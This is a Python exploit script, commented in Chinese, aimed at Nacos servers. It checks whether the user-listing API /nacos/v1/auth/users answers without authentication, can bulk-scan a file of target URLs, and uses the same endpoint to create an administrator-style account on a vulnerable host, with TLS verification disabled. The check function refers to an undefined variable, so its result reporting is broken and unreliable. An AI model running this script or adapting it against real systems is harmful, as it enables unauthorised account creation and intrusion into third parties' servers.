import argparse
import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help="输入一个url", default='')
parser.add_argument('-f', '--file', help="输入一个文件", default='')
parser.add_argument('-c', '--create_account', help="输入需要的创建账号", default='')
args = parser.parse_args()
urllib3.disable_warnings()


## 验证单个URL
def check(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if url.endswith("/"):
        path = "nacos/v1/auth/users/?pageNo=1&pageSize=9"
    else:
        path = "/nacos/v1/auth/users/?pageNo=1&pageSize=9"
    urlpath = url + path
    try:
        exp = requests.get(url=urlpath, headers=headers, verify=False)
        if "username" in exp.text and exp.status_code == 200:
            print("存在漏洞漏洞：" + cc)
        else:
            print("不存在漏洞：" + cc)
    except Exception as e:
        print("漏洞利用失败")


## 读取文件进行验证漏洞
def more(file):
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)

## 漏洞利用，创建账号
def exp(url):
    if url.endswith("/"):
        path = "nacos/v1/auth/users/"
    else:
        path = "/nacos/v1/auth/users/"
    urlpath = url + path
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    username = str(input("输入用户名"))
    password = str(input("输入密码"))
    data = "username=" + username + "&" + "password=" + password
    response = requests.post(url=urlpath, headers=headers, data=data, verify=False)
    if "create user ok!" in response.text and response.status_code == 200:
        print("创建成功")
    else:
        print("创建失败")


if __name__ == '__main__':
    if args.url != '' and args.file == '':
        check(args.url)
    if args.url == '' and args.file != '':
        more(args.file)
    if args.url == '' and args.file == '' and args.create_account != '':
        exp(args.create_account)
